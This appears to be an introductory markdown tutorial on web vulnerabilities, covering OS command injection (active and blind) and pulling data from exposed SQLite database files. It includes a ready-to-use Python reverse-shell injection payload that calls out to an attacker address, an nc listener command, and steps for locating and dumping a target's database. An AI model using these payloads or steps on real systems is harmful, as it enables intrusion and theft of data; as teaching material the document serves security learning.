 #                                         :muscle:  Web-Vulnerabilites

### 1. OS Command Injection :

### What is OS Command Injection ?

OS Command Injection is server side  web vulnerablities where attacker execute :eyes:" system command"  like id, whoami ,unamem etc os command  .
It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server.


### Types Of OS Commnad Injection :

                                  There are two types of OS command injection  such as :
                                                                           
                                                                                        i. Active OS command injection
                                
                                                                                        ii. Blind OS command injection
                                                                                       

### Active OS Command Injection :


Active command injection will return the response to the user.  It can be made visible through several HTML elements. That means when a attacker execute :eyes: "system command "  like ls ,server will return result of ls .(Attacker will se the result of ls ) .It is so easy to execute . 


### Blind OS Command Injection :
      
Blind command injection occurs when the system command made to the server does not return the response to the user in the HTML document . That means when a  attacker execute " system command "  like ls ,server will not return result of ls but  server execute ls command . For  , seening the result of :eyes: "system command " you must upload reverse shell on target / victim server . After ,uploaded  reverse shell on victim server , you must be  listen uploades shell on attacker terminal using nc command . 


### Example :
         
        🥇 1. upload reverse shell :
                                  ; python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'

           2. listen reverse shell :

                                 nc -lnvp 4242

Note : 
           
       1. Change ip according your local host ip
        
       2. One can easily  upload shell if OS command injection is occured .
              

2. Sqlite3 or "flat-file" :

When databases stored as a file it's called "flat-file"  .The extension of those file is db . ( like webapp.db , base.db )

Process :

               1.  At first   download  " flat-file " from target web app  . ( Use dirsearch or gobuster for exposing  flat-file directory )

               2.  Then  , expose sensitve data from "flat-file "  using sqlite3 


Use Of Sqlite3 :

                       sqlite3 target_file 

                      .help 

                      .tables

                      .schema table_name

                      select * from table_name ;  // see more //
                      
                     
